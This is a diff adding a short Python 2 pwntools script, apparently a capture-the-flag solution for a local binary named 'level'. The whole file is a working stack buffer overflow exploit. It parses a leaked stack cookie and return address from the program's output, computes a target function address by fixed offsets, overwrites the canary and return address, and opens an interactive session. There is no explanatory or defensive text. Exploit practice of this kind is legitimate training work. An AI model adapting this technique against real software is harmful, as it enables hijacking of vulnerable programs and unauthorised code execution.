@@ -1,0 +1,19 @@
+#!/usr/bin/env python2
+
+from pwn import *
+
+target = process("./level")
+
+target.readuntil("0\n")
+cookie = int(target.readline().strip())
+old_rbp = int(target.readline().strip())
+ret_addr = int(target.readline().strip())
+
+system_addr = ret_addr-0x9b7+0x83a
+buffor = "A"+p64(cookie)+8*"A"+p64(system_addr)
+
+target.clean()
+target.sendline(str(len(buffor)))
+target.send(buffor)
+target.interactive()
+
